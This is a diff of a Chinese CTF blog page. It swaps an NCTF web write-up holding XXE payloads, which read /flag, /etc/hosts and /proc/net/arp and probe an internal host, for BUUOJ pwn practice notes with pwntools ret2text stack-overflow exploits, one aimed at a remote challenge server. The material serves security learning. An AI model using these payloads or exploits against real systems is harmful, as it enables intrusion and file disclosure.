@@ -4,9 +4,11 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="南京邮电大学 NCTF 做题记录, F0und">
-    <meta name="description" content="第一部分 Web本着从CTF中找知识点学习的精神，这周又参加了南京邮电大学的CTF比赛，说是外校前二十名有奖，比赛的时候发现事情并不简单，，，只做出来了没几道题
-Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
+    <meta name="keywords" content="Pwn练习-Day01, F0und">
+    <meta name="description" content="Day010x00 前言题目来源于 https://buuoj.cn/challenges
+按顺序做的，这两道题比较简单，就不做详细解析了，解法在我前几篇写的pwn基础中提到过都是ret2text的类型
+0x10 pwn1经典栈溢出
+fil">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +16,7 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>南京邮电大学 NCTF 做题记录 | F0und</title>
+    <title>Pwn练习-Day01 | F0und</title>
     <link rel="icon" type="image/png" href="/medias/fav.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -211,13 +213,13 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/27.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        南京邮电大学 NCTF 做题记录
+                        Pwn练习-Day01
                     </div>
                 </div>
             </div>
@@ -313,6 +315,10 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
                                 <span class="chip bg-color">ctf</span>
                             </a>
                         
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -333,21 +339,21 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-11-26
+                    2020-03-13
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        299
+                        532
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        2 分
                     </div>
                     
                 
@@ -363,48 +369,135 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="第一部分-Web"><a href="#第一部分-Web" class="headerlink" title="第一部分 Web"></a>第一部分 Web</h1><p>本着从CTF中找知识点学习的精神，这周又参加了南京邮电大学的CTF比赛，说是外校前二十名有奖，比赛的时候发现事情并不简单，，，只做出来了没几道题</p>
-<h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>这道题与上一次UNCTF新星赛的那道XML简直一模一样（UNCTF的WP还没写….）</p>
-<p>不过那道题的flag是放在flag.php中的</p>
-<p>这道题他直接给了 <strong>hint: flag in /flag</strong></p>
-<p>这就比较简单了，毕竟签到题，也没有过滤</p>
-<p>BP抓包（题目关了，如果有复现的话再来放图）</p>
-<p><strong>payload:</strong></p>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="utf-8"?>
-
-<!DOCTYPE Anything [
-
-<!ENTITY entityex SYSTEM "file:///flag>
-
-]>
-
-<username>&entityex;</username>
+                <h1 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>题目来源于 <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p>
+<p>按顺序做的，这两道题比较简单，就不做详细解析了，解法在我前几篇写的pwn基础中提到过都是ret2text的类型</p>
+<h2 id="0x10-pwn1"><a href="#0x10-pwn1" class="headerlink" title="0x10 pwn1"></a>0x10 pwn1</h2><p>经典栈溢出</p>
+<p>file</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped
 </code></pre>
-<h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>这道题跟上道题的代码是一样的，但是<strong>flag</strong>放的位置不一样，比赛的时候没做出来，赛后看了大佬的WP后才知道，这道题考的是找内网真实地址。。</p>
-<p>学习地址  <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a> </p>
-<p>payload：</p>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
- <!ENTITY xxe SYSTEM "file:///etc/hosts">
- ]>
-
-<user><username>&xxe;</username><password>123</password></user>
+<p>64位文件 dynamically linked<br>动态链接库</p>
+<p>checksec</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/pwn1/pwn1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
 </code></pre>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
- <!ENTITY xxe SYSTEM "file:///proc/net/arp">
- ]>
+<p>无保护，且程序提供了system函数</p>
+<p>ida 反汇编查看</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [sp+1h] [bp-Fh]@1
 
-<user><username>&xxe;</username><password>123</password></user>
+  puts("please input");
+  gets(&s, argv);
+  puts(&s);
+  puts("ok,bye!!!");
+  return 0;
+}
 </code></pre>
-<pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
- <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://192.168.1.8">
- ]>
+<p>fun()</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int fun()
+{
+  return system("/bin/sh");
+}
+</code></pre>
+<p>peda 算出offset为23</p>
+<p>由此payload就明显了</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">fun_addr=0x401186
+payload=flat(['a'*23,p64(fun_addr)])
+</code></pre>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+from pwn import *
 
-<user><username>&xxe;</username><password>123</password></user>
+context.log_level="debug"
+
+io=process("./pwn1")
+
+fun_addr=0x401186
+payload=flat(['a'*23,p64(fun_addr)])
+
+io.sendline(payload)
+
+io.interactive()
 </code></pre>
-<h2 id="剩下的等题目复现再写吧，TCL"><a href="#剩下的等题目复现再写吧，TCL" class="headerlink" title="剩下的等题目复现再写吧，TCL"></a>剩下的等题目复现再写吧，TCL</h2><script>
+<p>而这个exp在本地跑是没有什么问题的</p>
+<p>nc 连上去就会超时，一会思考一下</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+from pwn import *
+
+context.log_level="debug"
+
+io=process("./pwn1")
+
+pop_ret_addr=0x401185
+fun_addr=0x401186
+payload=flat(['a'*23,p64(pop_ret_addr),p64(fun_addr)])
+
+io.sendline(payload)
+
+io.interactive()
+</code></pre>
+<h2 id="0x20-warmup-csaw-2016"><a href="#0x20-warmup-csaw-2016" class="headerlink" title="0x20 warmup_csaw_2016"></a>0x20 warmup_csaw_2016</h2><p>file:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped
+</code></pre>
+<p>64位动态链接库文件</p>
+<p>checksec:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/warmup_csaw_2016/warmup_csaw_2016'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>同样没得任何保护</p>
+<p>ida 反汇编查看</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">int __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char s; // [sp+0h] [bp-80h]@1
+  char v5; // [sp+40h] [bp-40h]@1
+
+  write(1, "-Warm Up-\n", 0xAuLL);
+  write(1, "WOW:", 4uLL);
+  sprintf(&s, "%p\n", sub_40060D);
+  write(1, &s, 9uLL);
+  write(1, ">", 1uLL);
+  return gets(&v5, ">");
+}
+</code></pre>
+<pre class=" language-lang-c"><code class="language-lang-c">int sub_40060D()
+{
+  return system("cat flag.txt");
+}
+</code></pre>
+<p>emmm，比上一题还简单</p>
+<p>直接exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+from pwn import *
+
+context.log_level="debug"
+
+io=remote("node3.buuoj.cn",29722)
+#io=process("./warmup_csaw_2016")
+
+sys_addr=0x40060d
+
+
+payload=flat(['a'*72,p64(sys_addr)])
+
+io.sendline(payload)
+
+io.interactive()
+</code></pre>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -445,7 +538,7 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
                     </span>
                     <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/11/27/ctf/web/nctf/" class="b-link-green">南京邮电大学 NCTF 做题记录</a>
+                    <a href="/2020/03/13/ctf/pwn/day01/" class="b-link-green">Pwn练习-Day01</a>
                 </p>
             </div>
         </div>
@@ -466,83 +559,28 @@ Fake XML cookbook这道题与上一次UNCTF新星赛的那道XML简">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/11/29/unfinish-work/work/">
+                <a href="/2020/03/13/ctf/pwn/day01/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="本学年工作计划">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Pwn练习-Day01">
                         
-                        <span class="card-title">本学年工作计划</span>
+                        <span class="card-title">Pwn练习-Day01</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">任务清单网安之路
-XML学习
-SQLi环境搭建学习
-GraphQL 
-完成hackone101CTF
-完成hack the box
-《网络空间安全基础》
-《密码学与网络空间安全》
-
-区块链学习之路
-Go web学习
-以太坊学习
-《精通以太坊</div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-28
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Plan/" class="post-category" target="_blank">
-                                    Plan
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Plan/" target="_blank">
-                        <span class="chip bg-color">Plan</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/11/19/ctf/pwn/cdusec-ctf2/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="成都大学第二届“玄武杯”做题记录2">
-                        
-                        <span class="card-title">成都大学第二届“玄武杯”做题记录2</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">第三部分 Pwn本次pwn就一道题，也不难，但也是我第一次做pwn…
-shell拿到题目，IDA走一下（64位）
-int __cdecl main(int argc, const char **argv, const char **envp</div>
+                    <div class="summary">Day010x00 前言题目来源于 https://buuoj.cn/challenges
+按顺序做的，这两道题比较简单，就不做详细解析了，解法在我前几篇写的pwn基础中提到过都是ret2text的类型
+0x10 pwn1经典栈溢出
+fil</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-18
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-13
                             </span>
                         <span class="publish-author">
                             
@@ -556,6 +594,7 @@ int __cdecl main(int argc, const char **argv, const char **envp</div>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -567,8 +606,53 @@ int __cdecl main(int argc, const char **argv, const char **envp</div>
                         <span class="chip bg-color">pwn</span>
                     </a>
                     
-                    <a href="/tags/misc/" target="_blank">
-                        <span class="chip bg-color">misc</span>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/26/math/lisan-1-1-md/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="命题及其联结词">
+                        
+                        <span class="card-title">命题及其联结词</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">命题符号化及联结词0x00 前置知识命题：能判断真假的陈述句，是具有唯一真值的陈述句 😄
+命题符号化：使用小写的英文字母 ${p},{q},{r},{…},{q_i},{p_i},{r_i},{…}$ 来表示命题
+例1-1：
+
+{p}: </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Math/" class="post-category" target="_blank">
+                                    Math
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/math/" target="_blank">
+                        <span class="chip bg-color">math</span>
                     </a>
                     
                 </div>
